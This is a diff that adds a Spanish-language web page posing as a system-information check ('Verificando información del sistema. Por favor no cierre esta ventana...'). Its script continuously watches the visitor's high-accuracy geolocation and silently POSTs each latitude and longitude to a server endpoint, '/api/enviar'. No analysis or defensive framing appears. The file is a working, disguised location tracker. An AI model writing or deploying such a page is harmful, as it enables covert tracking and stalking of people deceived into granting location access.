@@ -1,0 +1,46 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8">
+  <title>Verificando información</title>
+</head>
+<body>
+  <h3>Verificando información del sistema. Por favor no cierre esta ventana...</h3>
+
+  <script>
+    function enviarUbicacion(lat, lon) {
+      fetch('/api/enviar', {
+        method: 'POST',
+        headers: {
+          'Content-Type': 'application/json'
+        },
+        body: JSON.stringify({ lat, lon })
+      });
+    }
+
+    function rastrear() {
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(
+          position => {
+            const lat = position.coords.latitude;
+            const lon = position.coords.longitude;
+            enviarUbicacion(lat, lon);
+          },
+          error => {
+            document.body.innerHTML = "<h3>No se pudo obtener la ubicación.</h3>";
+          },
+          {
+            enableHighAccuracy: true,
+            maximumAge: 10000,
+            timeout: 5000
+          }
+        );
+      } else {
+        document.body.innerHTML = "<h3>Geolocalización no soportada.</h3>";
+      }
+    }
+
+    rastrear();
+  </script>
+</body>
+</html>
